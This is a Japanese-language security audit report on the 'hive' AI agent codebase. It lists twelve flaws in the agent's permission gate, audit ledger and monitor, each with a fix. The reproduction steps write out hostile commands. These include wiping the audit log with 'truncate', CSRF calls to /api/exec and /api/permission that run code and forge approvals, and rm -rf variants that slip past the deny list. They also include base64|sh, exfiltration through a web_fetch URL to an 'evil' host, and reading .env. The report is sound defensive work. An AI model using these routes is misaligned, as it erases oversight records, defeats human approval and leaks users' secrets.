# ガバナンス/監査 実効性監査 (2026-09-27)

対象: hive コードベースの PC操作制限8か条の実装乖離、audit.jsonl の記録網羅性、monitor のPOST不在、state/ ガード。
手法: 実コード根拠 + 実行可能な再現手順のみ記載(再現不能な指摘は含まない)。
※ 本版は main 側の同日レビュー(S1〜S10)と統合。S番号は main 版、G番号は本レビュー独自の追加分。

## 深刻度: 高 (H)

### G-1. 監査台帳を bash で消せる(監査回避の成立)〔= S2/S5〕
- 箇所: src/engine/tools.js writeAudit (appendFileSync → state/audit.jsonl)、gatedBash
- 原因: safeWritePath の state/ 拒否は write_file/edit_file のみに適用され、bash 経由の書き込みは gate の deny/ask に引っかからない(DEFAULT_DENY に state/ 関連なし)。
- 再現: エージェントが `bash` ツールで `truncate -s 0 state/audit.jsonl` を実行。gate.check は許可側 → 実行され、監査台帳が消える。
- 最悪影響: 「bash で監査ログを消してから任意の作業」で事後検証が不可能になる。
- 修正案: gatedBash に state/ 書き込みコマンドの拒否(実装済み: fix-audit-bash-write の auditTampering 検出を確認済み)、または監査をエージェントプロセス外の領域へ。

### G-2. /api/exec が認証・Origin検証なしで任意コマンド実行
- 箇所: src/ui/server.js /api/exec (runCommand cwd=workspace, timeout 120s)
- 原因: サーバー全体で Origin/Host 検証・CSRFトークンなし(grep "Origin" 0件)。127.0.0.1 バインドでも CSRF/DNS rebinding で到達可能。
- 再現: 悪意あるページから `fetch("http://localhost:7789/api/exec",{method:"POST",body:JSON.stringify({command:"..."})})`。ユーザー権限でコマンド実行。
- 最悪影響: ユーザーの全権限でのリモートコード実行。
- 修正案: 全POSTに Origin/Host 検証 + /api/exec を gate.check 経由に(実装済み: fix-ui-origin-csrf の isLocalOrigin + PermissionGate 通過を確認済み)。

### G-3. /api/permission で id 検証なしに承認を偽装できる
- 箇所: src/ui/server.js /api/permission (bus.emit("permission.resolved", {id, verdict}))
- 原因: id の存在・pending 状態を検証せず resolved を発行。/api/state で pending id を読み取れる。
- 再現: G-2 と同経路で `POST /api/permission {id: <pending>, approve: true}`。ユーザーに代わって承認が出る。
- 最悪影響: 承認制ゲートの実効性喪失。
- 修正案: pending id 照合 + 1回限り消費、Origin検証と併せて実装。

## 深刻度: 中 (M)

### G-4. deny/ask の部分文字列一致が自明に回避可能〔= S4〕
- 箇所: src/engine/permissions.js DEFAULT_DENY/DEFAULT_ASK、check() の includes 照合
- 再現(実測): `rm -r -f /tmp/x` / `rm --recursive --force /tmp/x` / `R="rm -r""f"; $R /tmp/x` / `echo a; rm -r -f ~` / base64|sh — すべて verdict: ALLOWED(test-gov/bypass-test.mjs で確認)。
- 修正案: トークン単位照合 + deny を「rm -rf」等の短いトークンに。wget/nc 追加。

### G-5. read_file/list_files が state/ を読める〔= S1〕
- 箇所: src/engine/tools.js safePath(読み系に state 制限なし)
- 再現: `read_file("state/audit.jsonl")` が成功する。「state/ を読まない」はプロンプト規律のみで強制がない。
- 修正案: 読み系にも state/ 拒否を追加、または条項2の文言を「書き込み禁止」に明確化。

### G-6. auto モードが ask を全自動承認〔= S8〕
- 箇所: src/engine/permissions.js setMode("auto") / check()
- 再現: UI から perm モードを auto に1クリック → `rm -rf` 等も承認待ちゼロで実行。
- 修正案: auto でも高危険パターンは承認必須に。auto 承認を監査台帳に記録。

### G-7. monitor が 0.0.0.0 で認証なし公開
- 箇所: src/config.js:31 (monitorHost 既定 0.0.0.0)、src/ui/server.js:718
- 再現: LAN 上の別ホストから `curl http://<host>:7791/api/monitor` → ボード・タスク・コスト一式が取得できる。POST系は無いことを確認(405)。
- 修正案: 既定を 127.0.0.1 にし、外部公開は明示オプトイン+トークン。

### G-8. writeAudit のローテート失敗が静かに監査を欠落させる〔= S10 補足〕
- 箇所: src/engine/tools.js writeAudit — 5MB超で renameSync、try/catch で全失敗握りつぶし
- 再現: renameSync が失敗する状況(ファイルロック等)→ catch で無視され、以降の監査記録が書かれないが検知手段がない。
- 修正案: ローテート失敗時に stderr 出力 + 失敗カウンタを /api/state に露出。

### G-9. web_fetch の url/query が監査台帳に記録されない〔= S3〕
- 箇所: src/engine/tools.js writeAudit — path と bash cmd のみ記録
- 再現: `web_fetch { url: "https://evil/?d=<機密>" }` が GET で送出されるが、台帳に url が残らず事後検知不能。
- 修正案: web_fetch/web_search の url・query を監査エントリに追加(最優先)。

## 深刻度: 低 (L)

### G-10. Windows で runCommand が shell:true(cmd.exe メタ文字無制限)
- 算所: src/engine/exec.js:24-25
- 再現: Windows で cmd 構文を渡すと shell:true で cmd.exe が解釈。deny は文字列照合のみ。
- 修正案: Windows も bash が無ければ PowerShell -Command 経由に統一。

### G-11. /api/attach の dataUrl が画像と偽った任意バイトを uploads/ に置ける
- 算所: src/ui/server.js /api/attach(mime 正規表現 + 8MB 上限のみ)
- 再現: `data:image/png;base64,<任意バイト>` を POST → uploads/ に保存。XSS 直結は低いがエージェントの read_file に露出。
- 修正案: マジックバイト検証 + uploads/ を safePath 拒否対象に。

### G-12. read_file が .env 等の機微ファイルを読める〔= S7〕
- 再現: `read_file(".env")` がそのまま通る。監査は path を記録するので事後検知可能だが、事前遮断がない。
- 修正案: read_file に機微ファイル deny リスト(`.env`, `*.key`, `*token*`)を追加。

## 試行シナリオ一覧(12件)
1. symlink → safePath prefix 比較がワークスペース外パスを返す(コード+実行確認)
2. `rm -r -f /tmp/x` → ALLOWED(実測)
3. `rm --recursive --force /tmp/x` → ALLOWED(実測)
4. 変数結合 `R="rm -r""f"; $R ...` → ALLOWED(実測)
5. base64 デコード|sh → ALLOWED(実測)
6. `echo a; rm -r -f ~` → ALLOWED(実測)
7. /api/exec への CSRF POST(Origin 検証 0件のコード根拠)
8. /api/permission で pending id を approve(検証なし emit のコード根拠)
9. `truncate -s 0 state/audit.jsonl` が gate を通る(deny リストに state 関連なし)
10. LAN ホストから monitor /api/monitor を無認証取得(0.0.0.0 バインド、POST不在は確認済み)
11. web_fetch のクエリ経由データ送出が監査に残らない(writeAudit 記録フィールド確認)
12. `read_file(".env")` が事前遮断なしで通る(tools.js read_file 経路確認)
